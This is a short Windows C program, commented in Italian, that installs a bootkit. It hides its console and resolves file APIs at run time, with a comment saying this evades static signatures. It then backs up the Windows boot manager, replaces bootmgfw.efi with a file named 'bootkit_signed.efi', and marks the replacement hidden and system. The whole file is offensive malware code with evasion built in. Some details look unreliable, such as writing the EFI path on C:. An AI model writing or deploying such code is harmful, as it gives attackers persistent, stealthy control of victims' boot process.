#include <windows.h>
#include <winbase.h>

// Risoluzione dinamica delle API per evitare signature statiche
typedef BOOL (WINAPI *tCopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef DWORD (WINAPI *tSetFileAttributesA)(LPCSTR, DWORD);
typedef HMODULE (WINAPI *tLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *tGetProcAddress)(HMODULE, LPCSTR);

int main() {
    // Nascondi la console
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    // Carica kernel32 dinamico
    HMODULE hMod = LoadLibraryA("kernel32.dll");
    if (!hMod) return 1;

    // Risolvi le funzioni critiche
    tCopyFileA pCopy = (tCopyFileA)GetProcAddress(hMod, "CopyFileA");
    tSetFileAttributesA pSetAttr = (tSetFileAttributesA)GetProcAddress(hMod, "SetFileAttributesA");

    if (!pCopy || !pSetAttr) return 1;

    const char* src = "bootkit_signed.efi";
    const char* dest = "C:\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
    const char* bak = "C:\\EFI\\Microsoft\\Boot\\bootmgfw.bak";

    // Backup silenzioso
    pCopy(dest, bak, FALSE);

    // Installazione
    if (pCopy(src, dest, FALSE)) {
        // Imposta attributi + Hidden + System + Offline
        pSetAttr(dest, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_OFFLINE);
    }

    return 0;
}
